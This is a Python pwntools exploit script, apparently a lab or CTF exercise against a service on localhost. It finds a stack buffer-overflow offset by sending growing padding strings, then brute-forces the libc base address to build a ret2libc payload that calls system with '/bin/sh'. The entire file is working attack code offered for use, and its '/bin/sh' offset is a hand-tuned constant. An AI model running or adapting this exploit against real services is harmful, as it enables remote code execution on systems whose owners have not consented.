import struct
import time
import socket
from pwn import *

HOST = "localhost"
PORT = 9999

def generar_direcciones_libc(base_start=0xf7d00000, base_end=0xf7f00000, page_size=0x1000):
    return [addr for addr in range(base_start, base_end, page_size)]
    
def send_payload(payload_data):
    """
    Send payload to target server and receive response.
    Args:
        payload_data: The data to send to the target
    """
    # Enviar binario directo a stdout (como un pipe a nc)
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.connect((HOST, PORT))
        # print(f"Payload length: {len(payload_data)}")
        # Send payload
        sock.sendall(payload_data)
        # Receive response
        response = sock.recv(2048)
        if response:
            print(f"Response: {response}")
            return True
        # Wait before next attempt
        # time.sleep(0.1)
    except socket.error as sock_error:
        print(f"Socket error: {sock_error}")
    finally:
        sock.close()
    return False



def calcular_offset():
    """
    Calculate the offset for the payload.
    """
    # This is a placeholder function. The actual implementation will depend on the target binary.
    # For example, you might want to use gdb or another tool to find the correct offset.
    i = 1
    while True:
        # print(f"Trying offset: {i}")
        PAYLOAD = b"AAAA" * i
        RESPONSE = send_payload(PAYLOAD)
        if not RESPONSE:
            print(f"[+] GOT IT: offset = {i}")
            return (i-1) * 4
            break
        i += 1
    
    return 




offset = calcular_offset()



libc = ELF("/lib32/libc.so.6")  # usa la misma que el servidor
system_offset = libc.symbols["system"]
exit_offset = libc.symbols["exit"]
binsh_offset =  0x18dc9b + 0x9 # next(libc.search(b"ls")) #
# offset = 148

print(f"system_offset: {hex(system_offset)}")
print(f"exit_offset: {hex(exit_offset)}")
print(f"binsh_offset: {hex(binsh_offset)}")
print(f"libc_base: {hex(libc.address)}")
print(f"system: {hex(libc.address + system_offset)}")




libc_base_guesses = generar_direcciones_libc()

print(f"Guesses: {len(libc_base_guesses)}")

for base in libc_base_guesses:
    system = struct.pack("<I", (base + system_offset))
    exit_addr = struct.pack("<I", (base + exit_offset))
    binsh  = struct.pack("<I", (base + binsh_offset))

    PAYLOAD = b"A" * offset
    PAYLOAD += system
    PAYLOAD += exit_addr
    PAYLOAD += binsh

    # print(f"Trying payload: {PAYLOAD}")

    RESPONSE = send_payload(PAYLOAD)

    if RESPONSE:
        print(f"[+] GOT IT: base = {hex(base)}")
        break